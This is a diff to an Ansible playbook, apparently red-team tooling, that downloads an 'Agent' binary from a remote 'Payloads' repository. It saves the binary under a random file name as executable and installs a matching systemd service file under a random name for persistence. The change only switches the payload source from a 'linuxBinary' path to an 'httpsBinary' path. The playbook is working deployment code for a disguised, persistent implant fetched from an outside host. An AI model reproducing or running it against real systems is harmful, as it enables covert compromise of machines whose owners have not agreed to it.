@@ -23,14 +23,14 @@
 
 - name: Linux Deploy | Download Agent
   get_url:
-    url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxBinary/main?ref_type=heads
+    url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/httpsBinary/linux?ref_type=heads
     dest: "{{ linux_path }}{{ linux_random_file_name }}"
     mode: '0755'
   when: ansible_os_family in linux_distros
 
 - name: Linux Deploy | Download Service File
   get_url:
-    url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxBinary/linuxServiceFile.service?ref_type=heads
+    url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/httpsBinary/linuxServiceFile.service?ref_type=heads
     dest: "/lib/systemd/system/{{ linux_random_file_name }}.service"
     mode: 644
   when: ansible_os_family in linux_distros
